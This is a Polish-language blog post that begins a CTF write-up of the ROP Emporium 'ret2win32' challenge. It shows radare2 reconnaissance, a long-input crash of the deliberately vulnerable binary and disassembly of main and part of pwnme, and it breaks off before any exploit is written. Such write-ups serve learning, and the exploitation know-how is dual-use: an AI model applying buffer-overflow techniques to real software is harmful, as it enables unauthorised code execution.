<!doctype html><html lang=pl><head><title>foxtrot_charlie vs ROP Emporium akt I :: FoxtrotLabs — Tam gdzie bajty mówią dobranoc</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="&#34;No przecież piszę tego posta...&#34; - foxtrot_charlie 0bd2f9b87f862629f04ba850c60bb890f9a80c7ca7e293503f298a93c08b6c54
0x00 - Wracamy po dłuższej przerwie Ostatni rok był dla mnie bardzo szczególny. Nie wchodząc nadmiernie w nudne tłumaczenia, chciałbym zdementować jakobym rzucił tego bloga. Po prostu brakło czasu, a skill sam się nie wyekspi. Co nie znaczy, że zostałem pr0 h4Xi0r3m. Do tego jeszcze długa droga, tym niemniej wracam na scenę (taką jednoosobową, jak ten blog!). Skoro nowy rok to i stary ja :D!"><meta name=keywords content="hacking"><meta name=robots content="noodp"><link rel=canonical href=https://foxtrotlabs.cc/pl/2019/01/foxtrot_charlie-vs-rop-emporium-akt-i/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://foxtrotlabs.cc/assets/style.css><link rel=stylesheet href=assets/%25!s%28%3cnil%3e%29.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href><meta name=twitter:card content="summary"><meta name=twitter:creator content="foxtrot_charlie"><meta property="og:locale" content="pl"><meta property="og:type" content="article"><meta property="og:title" content="foxtrot_charlie vs ROP Emporium akt I :: FoxtrotLabs"><meta property="og:description" content="BufferOverflow wiecznie żywy, czyli foxtrot_charlie w krainie powracających gadżetów"><meta property="og:url" content="https://foxtrotlabs.cc/pl/2019/01/foxtrot_charlie-vs-rop-emporium-akt-i/"><meta property="og:site_name" content="foxtrot_charlie vs ROP Emporium akt I"><meta property="og:image" content><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:section" content="hacking"><meta property="article:section" content="binary exploitation"><meta property="article:section" content="rop"><meta property="article:published_time" content="2019-01-14 23:14:29 +0100 +0100"></head><body><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=https://foxtrotlabs.cc/pl><div class=logo>foxtrotlabs-pl</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=https://foxtrotlabs.cc/pl/posts>posty</a></li><li><a href=https://foxtrotlabs.cc/>English side</a></li><li><a href=https://foxtrotlabs.cc/pl/about>o mnie</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=https://foxtrotlabs.cc/pl/posts>posty</a></li><li><a href=https://foxtrotlabs.cc/>English side</a></li><li><a href=https://foxtrotlabs.cc/pl/about>o mnie</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul></nav><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script></header><div class=content><div class=post><h1 class=post-title><a href=https://foxtrotlabs.cc/pl/2019/01/foxtrot_charlie-vs-rop-emporium-akt-i/>foxtrot_charlie vs ROP Emporium akt I</a></h1><div class=post-meta><span class=post-date>2019-01-14
</span><span class=post-author>::
foxtrot_charlie</span></div><span class=post-tags>#<a href=https://foxtrotlabs.cc/pl/tags/buffer/>buffer</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/overflow/>overflow</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/radare2/>radare2</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/gdb/>gdb</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/hacking/>hacking</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/security/>security</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/binary/>binary</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/exploitation/>exploitation</a>&nbsp;</span><div class=post-content><div><center>"No przecież piszę tego posta..." - foxtrot_charlie</center><p>0bd2f9b87f862629f04ba850c60bb890f9a80c7ca7e293503f298a93c08b6c54</p><h3 id=0x00---wracamy-po-dłuższej-przerwie>0x00 - Wracamy po dłuższej przerwie<a href=#0x00---wracamy-po-dłuższej-przerwie class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Ostatni rok był dla mnie bardzo szczególny. Nie wchodząc nadmiernie w nudne tłumaczenia, chciałbym zdementować jakobym rzucił tego bloga. Po prostu brakło czasu, a skill sam się nie wyekspi. Co nie znaczy, że zostałem pr0 h4Xi0r3m. Do tego jeszcze długa droga, tym niemniej wracam na scenę (taką jednoosobową, jak ten blog!). Skoro <strong>nowy rok</strong> to i <strong>stary ja</strong> :D!</p><p>Tym nieco zrzędliwym wstępem rozpocząłem kolejny wpis po polskiej stronie bloga. Bardzo chciałbym pisać częśćiej. I mam wrażenie, że to się uda&mldr; Na razie przede mną jeden z ważniejszych CTFów w życiu - obrona pracy dyplomowej, więc jeśli FC zamilknie w lutym, to proszę nie wysyłać CSAR ani MEDEVAC. A co dziś w menu?</p><p>Osobiście uważam ROP za jedną z ciekawszych form eksploitacji. Lata frywolnego wywalania programów i wykonywania dowolnego kodu (Phrack - Smashing the Stack for Fun and Pofit) zostało ukrócone przez DEP/NX, W xor X, ASLR. Ktoś mądry stwierdził wtedy, że <code>nie to nie, skoro nie mogę użyć własnego kodu, to sobie wykorzystam kod programu, skoro już tam jest</code>.</p><p>Zawsze aby lepiej zrozumieć zagadnienie, lubię sobie nad nim troszeczkę pogłówkować i spróbować rozwiązać jakiś problem, nazwijmy go <strong>inżynierski</strong>. Dlatego postanowiłem przećwiczyć <em>cough</em> programowanie zorientowane na powracanie <em>cough</em> (przepraszam, nie mogłem się oprzeć&mldr;), na zadankach CTFowych. Ale żeby daleko ich nie szukać, na warsztat wziąłem znane taski ze zbioru ROP Emporium.</p><p>W każdym kolejnym poście postaram się poruszyć jedno wyzwanie z ROP.</p><p><strong>Na wstępie chciałbym zaznaczyć, że niniejszy artykuł to zbiór moich notatek z placu boju. Mogą się pojawić skróty myślowe oraz nie do końca śmieszny humor</strong></p><h3 id=0x01-ret2win32---rozpoznanie>0x01 ret2win32 - rozpoznanie<a href=#0x01-ret2win32---rozpoznanie class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Pierwszym zadaniem z serii ROP-E jest <a href=https://ropemporium.com/challenge/ret2win.html>ret2win</a> &lt;spoiler_alert=off\>. Celem tego wyzwania będzie przekierowanie flow programu przez nadpisanie adresu powrotu.</p><p>Odpaliwszy najbardziej hakierską dystrybucję Linuxa we Wszechświecie (no dobra, drugą po Pentoo, ale nie miałem czasu na kompilację) możemy zaczynać! Na początek niewielki rekonesans. Niby to zadanie zostało dobrze opisane przez Autorów, niemniej w celu odkurzenia narzędzi przeprowadzę szybkie rozpoznanie. Warto pamiętać, że:</p><blockquote><p>Godziny prób i błędów mogą zaoszczędzić 5 minut czytania dokumentacji</p></blockquote><p>Dlatego weryfikacja obietnic złożonych przy linku z zadaniem może się przydać i pomoże utwierdzić się w przekonaniu o zrozumieniu założeń wyzwania.</p><hr><pre><font color=#D05000>[0x08048480]&gt;</font> i
blksz    0x0
block    0x100
fd       3
file     ret2win32
format   elf
iorw     false
mode     r-x
size     0x1e04
humansz  7.5K
type     EXEC (Executable file)
arch     x86
baddr    0x8048000
binsz    6442
bintype  elf
bits     32
canary   false
sanitiz  false
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
</pre><hr><p>32 bitowy ELF, bez kanarków na stosie, NX włączony, binarka nieostripowana. Spójrzmy na funkcje&mldr;</p><hr><pre><font color=#EF2929><b>root@kali</b></font>:<font color=#729FCF><b>~/rop</b></font># r2 ret2win32
 -- Experts agree, security holes suck, and we fixed some of them!
<font color=#D05000>[0x08048480]&gt;</font> aaaaaaa
An r2 developer is coming to your place to manually analyze this program. Please wait for it

--press any key--
</pre><hr><p>Niestety czekałem ponad 4h i nikt nie przyszedł. Spróbuję w inny dzień. To by było na tyle, cześć!*</p><p>No dobra, głupio wrzucać post z teaserem rozwiązania zadania, po czym kończyć dlatego, że mi licencja na developerów radare2 wygasła.
Poniższy listing pokazuje listę funkcji w rozważanej binarce.</p><hr><pre>
<font color=#D05000>[0x08048480]&gt;</font> aaaa
<font color=#4E9A06>[x]</font> Analyze all flags starting with sym. and entry0 (aa)
<font color=#4E9A06>[x]</font> Analyze function calls (aac)
<font color=#4E9A06>[x]</font> Analyze len bytes of instructions for references (aar)
<font color=#4E9A06>[x]</font> Constructing a function name for fcn.* and sym.func.* functions (aan)
<font color=#4E9A06>[x]</font> Enable constraint types analysis for variables
<font color=#D05000>[0x08048480]&gt;</font> afl
0x080483c0    3 35           sym._init
0x08048400    1 6            sym.imp.printf
0x08048410    1 6            sym.imp.fgets
0x08048420    1 6            sym.imp.puts
0x08048430    1 6            sym.imp.system
0x08048440    1 6            sym.imp.__libc_start_main
0x08048450    1 6            sym.imp.setvbuf
0x08048460    1 6            sym.imp.memset
0x08048470    1 6            sub.__gmon_start_8048470
0x08048480    1 33           entry0
0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
0x080484c0    4 43           sym.deregister_tm_clones
0x080484f0    4 53           sym.register_tm_clones
0x08048530    3 30           sym.__do_global_dtors_aux
0x08048550    4 43   -&gt; 40   entry.init0
0x0804857b    1 123          sym.main
0x080485f6    1 99           sym.pwnme
0x08048659    1 41           sym.ret2win
0x08048690    4 93           sym.__libc_csu_init
0x080486f0    1 2            sym.__libc_csu_fini
0x080486f4    1 20           sym._fini
</pre><hr><p>Trzy funkcje, na które napewno warto spojrzeć:</p><pre tabindex=0><code>0x0804857b    1 123          sym.main
0x080485f6    1 99           sym.pwnme
0x08048659    1 41           sym.ret2win
</code></pre><h2 id=0x01-ret2win32---szybka-eksploitacja>0x01 ret2win32 - szybka eksploitacja<a href=#0x01-ret2win32---szybka-eksploitacja class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Ale zanim przejdziemy do dalszej części tego zadania, odpalmy binarkę:</p><hr><pre><font color=#EF2929><b>root@kali</b></font>:<font color=#729FCF><b>~/rop</b></font># ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don&apos;t worry about null bytes, we&apos;re using fgets!

&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
</pre><hr><p><strong>SIDENOTE:</strong> uruchomienie nastąpiło z roota, ale na VMce ze zaktualizowanym HyperVizorem więc mam nadzieję, że przeżyję ;)</p><p>Baner binarki nie kłamał. Rzeczywiście próbuje zmieścić trochę więcej danych niż faktyczna pojemność bufora (albo segfault rzucany jest z innego powodu gdy podamy input > 32 znaków, zaraz to sprawdzimy). Spójrzmy najpierw na funkcję main.</p><hr><pre><font color=#D05000>[0x08048480]&gt;</font> pdf @ sym.main
  <font color=#D05000>          ;-- main:</font>
<font color=#D0D0C0>┌</font> <font color=#D05000>(fcn) sym.main</font> 123
<font color=#D0D0C0>│</font>   int <font color=#D05000>sym.main</font> (int argc, char **argv, char **envp);
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#70A070>; var </font><font color=#E0E0C0>int local_4h </font><font color=#A0A0A0>@ ebp-0x4</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#70A070>; arg </font><font color=#E0E0C0>int arg_4h </font><font color=#A0A0A0>@ esp+0x4</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#70A070>; DATA XREF from entry0 (0x8048497)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804857b</font>      <font color=#A0A0A0>8d</font><font color=#D0D0C0>4c24</font><font color=#A0A0A0>04</font>       <font color=#C0D090>lea</font><font color=#80D0D0> ecx</font>,<font color=#80D0D0> </font>[<font color=#E0E0C0>arg_4h</font>]<font color=#70A070>           ; 4</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804857f</font>      <font color=#A0A0A0>83e4f0</font>         <font color=#F0C0B0>and</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xfffffff0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048582</font>      <font color=#80A080>ff</font><font color=#D0D0C0>71</font><font color=#A0A0A0>fc</font>         <font color=#F0F0C0>push dword </font>[<font color=#80D0D0>ecx </font>-<font color=#80D0D0> </font><font color=#C08080>4</font>]
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048585</font>      <font color=#D0D0C0>55</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> ebp</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048586</font>      <font color=#A0A0A0>89e5</font>           <font color=#C0D090>mov</font><font color=#80D0D0> ebp</font>,<font color=#80D0D0> esp</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048588</font>      <font color=#D0D0C0>51</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> ecx</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048589</font>      <font color=#A0A0A0>83ec04</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>4</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804858c</font>      <font color=#A0A0A0>a1</font><font color=#D0D0C0>64</font><font color=#A0A0A0>a00408</font>     <font color=#C0D090>mov</font><font color=#80D0D0> eax</font>,<font color=#80D0D0> dword </font>[<font color=#C08080>obj.stdout</font>]<font color=#70A070> ; obj.stdout__GLIBC_2.0 ; [0x804a064:4]=0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048591</font>      <font color=#D0D0C0>6a</font><font color=#80A080>00</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048593</font>      <font color=#D0D0C0>6a</font><font color=#A0A0A0>02</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>2</font><font color=#70A070>                      ; 2</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048595</font>      <font color=#D0D0C0>6a</font><font color=#80A080>00</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048597</font>      <font color=#D0D0C0>50</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> eax</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048598</font>      <font color=#A0A0A0>e8b3fe</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.setvbuf</font><font color=#70A070>        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804859d</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485a0</font>      <font color=#A0A0A0>a1</font><font color=#D0D0C0>40</font><font color=#A0A0A0>a00408</font>     <font color=#C0D090>mov</font><font color=#80D0D0> eax</font>,<font color=#80D0D0> dword </font>[<font color=#C08080>obj.stderr</font>]<font color=#70A070> ; obj.stderr__GLIBC_2.0 ; [0x804a040:4]=0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485a5</font>      <font color=#D0D0C0>6a</font><font color=#80A080>00</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485a7</font>      <font color=#D0D0C0>6a</font><font color=#A0A0A0>02</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>2</font><font color=#70A070>                      ; 2</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485a9</font>      <font color=#D0D0C0>6a</font><font color=#80A080>00</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485ab</font>      <font color=#D0D0C0>50</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> eax</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485ac</font>      <font color=#A0A0A0>e89ffe</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.setvbuf</font><font color=#70A070>        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485b1</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485b4</font>      <font color=#A0A0A0>83ec0c</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xc</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485b7</font>      <font color=#D0D0C0>68</font><font color=#A0A0A0>10870408</font>     <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>str.ret2win_by_ROP_Emporium</font><font color=#70A070> ; 0x8048710 ; &quot;ret2win by ROP Emporium&quot;</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485bc</font>      <font color=#A0A0A0>e8</font><font color=#D0D0C0>5f</font><font color=#A0A0A0>fe</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.puts</font><font color=#70A070>           ; int puts(const char *s)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485c1</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485c4</font>      <font color=#A0A0A0>83ec0c</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xc</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485c7</font>      <font color=#D0D0C0>6828</font><font color=#A0A0A0>870408</font>     <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>str.32bits</font><font color=#70A070>             ; 0x8048728 ; &quot;32bits\n&quot;</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485cc</font>      <font color=#A0A0A0>e8</font><font color=#D0D0C0>4f</font><font color=#A0A0A0>fe</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.puts</font><font color=#70A070>           ; int puts(const char *s)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485d1</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485d4</font>      <font color=#A0A0A0>e81d</font><font color=#80A080>000000</font>     <font color=#D05020>call sym.pwnme</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485d9</font>      <font color=#A0A0A0>83ec0c</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xc</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485dc</font>      <font color=#D0D0C0>6830</font><font color=#A0A0A0>870408</font>     <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>str.Exiting</font><font color=#70A070>            ; 0x8048730 ; &quot;\nExiting&quot;</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485e1</font>      <font color=#A0A0A0>e8</font><font color=#D0D0C0>3a</font><font color=#A0A0A0>fe</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.puts</font><font color=#70A070>           ; int puts(const char *s)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485e6</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485e9</font>      <font color=#A0A0A0>b8</font><font color=#80A080>00000000</font>     <font color=#C0D090>mov</font><font color=#80D0D0> eax</font>,<font color=#80D0D0> </font><font color=#C08080>0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485ee</font>      <font color=#A0A0A0>8b</font><font color=#D0D0C0>4d</font><font color=#A0A0A0>fc</font>         <font color=#C0D090>mov</font><font color=#80D0D0> ecx</font>,<font color=#80D0D0> dword </font>[<font color=#E0E0C0>local_4h</font>]
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485f1</font>      <font color=#A0A0A0>c9</font>             <font color=#F0F0C0>leave</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485f2</font>      <font color=#A0A0A0>8d</font><font color=#D0D0C0>61</font><font color=#A0A0A0>fc</font>         <font color=#C0D090>lea</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font>[<font color=#80D0D0>ecx </font>-<font color=#80D0D0> </font><font color=#C08080>4</font>]
<font color=#D0D0C0>└</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485f5</font>      <font color=#A0A0A0>c3</font>             <font color=#F0F080>ret</font>
<font color=#D05000>[0x08048480]&gt;</font>
</pre><hr><p>Wywoływana z <code>main()</code>, funkcja <code>sym.pwnme</code> została przedstawiona na listingu poniżej. Jak można się domyślić, to jest nasza podatna funkcja. W celu rozwiązania zadania (i przeczytania zawartości pliku flag.txt) należy wykorzystać błędną sanityzację danych (a właściwie błędną obsługę ich długości) aby przekierować wykonanie kodu do funkcji <code>sym.ret2win</code></p><hr><pre><font color=#D05000>[0x08048480]&gt;</font> pdf @ sym.pwnme
<font color=#D0D0C0>┌</font> <font color=#D05000>(fcn) sym.pwnme</font> 99
<font color=#D0D0C0>│</font>   <font color=#D05000>sym.pwnme</font> ();
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#70A070>; var </font><font color=#E0E0C0>int local_28h </font><font color=#A0A0A0>@ ebp-0x28</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#70A070>; CALL XREF from sym.main (0x80485d4)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485f6</font>      <font color=#D0D0C0>55</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> ebp</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485f7</font>      <font color=#A0A0A0>89e5</font>           <font color=#C0D090>mov</font><font color=#80D0D0> ebp</font>,<font color=#80D0D0> esp</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485f9</font>      <font color=#A0A0A0>83ec</font><font color=#D0D0C0>28</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x28</font><font color=#70A070>               ; &apos;(&apos;</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485fc</font>      <font color=#A0A0A0>83ec04</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>4</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x080485ff</font>      <font color=#D0D0C0>6a20</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>0x20</font><font color=#70A070>                   ; 32</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048601</font>      <font color=#D0D0C0>6a</font><font color=#80A080>00</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048603</font>      <font color=#A0A0A0>8d</font><font color=#D0D0C0>45</font><font color=#A0A0A0>d8</font>         <font color=#C0D090>lea</font><font color=#80D0D0> eax</font>,<font color=#80D0D0> </font>[<font color=#E0E0C0>local_28h</font>]
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048606</font>      <font color=#D0D0C0>50</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> eax</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048607</font>      <font color=#A0A0A0>e8</font><font color=#D0D0C0>54</font><font color=#A0A0A0>fe</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.memset</font><font color=#70A070>         ; void *memset(void *s, int c, size_t n)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804860c</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804860f</font>      <font color=#A0A0A0>83ec0c</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xc</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048612</font>      <font color=#D0D0C0>683c</font><font color=#A0A0A0>870408</font>     <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>str.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_into_32_bytes_of_stack_buffer___What_could_possibly_go_wrong</font><font color=#70A070> ; 0x804873c ; &quot;For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?&quot;</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048617</font>      <font color=#A0A0A0>e804fe</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.puts</font><font color=#70A070>           ; int puts(const char *s)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804861c</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804861f</font>      <font color=#A0A0A0>83ec0c</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xc</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048622</font>      <font color=#D0D0C0>68</font><font color=#A0A0A0>bc870408</font>     <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>str.You_there_madam__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_fgets</font><font color=#70A070> ; 0x80487bc ; &quot;You there madam, may I have your input please? And don&apos;t worry about null bytes, we&apos;re using fgets!\n&quot;</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048627</font>      <font color=#A0A0A0>e8f4fd</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.puts</font><font color=#70A070>           ; int puts(const char *s)</font>
